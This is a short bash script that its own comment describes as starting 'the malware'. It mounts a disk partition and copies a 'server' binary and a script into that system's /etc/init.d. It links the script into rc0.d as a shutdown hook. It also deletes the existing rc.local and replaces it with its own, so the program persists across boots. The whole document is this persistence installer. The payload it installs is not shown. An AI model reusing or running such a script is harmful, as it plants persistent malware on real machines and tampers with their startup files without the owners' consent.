#!/bin/bash
# This script is used to start the malware

make
mkdir folder
mount /dev/sda1 folder
cp server folder/etc/init.d
cp script.sh folder/etc/init.d
ln -s ../init.d/script.sh folder/etc/rc0.d/K99server.sh
chmod +x folder/etc/rc0.d/K99server.sh
rm folder/etc/rc.local
cp rc.local folder/etc
umount folder
rm -r folder

#exit
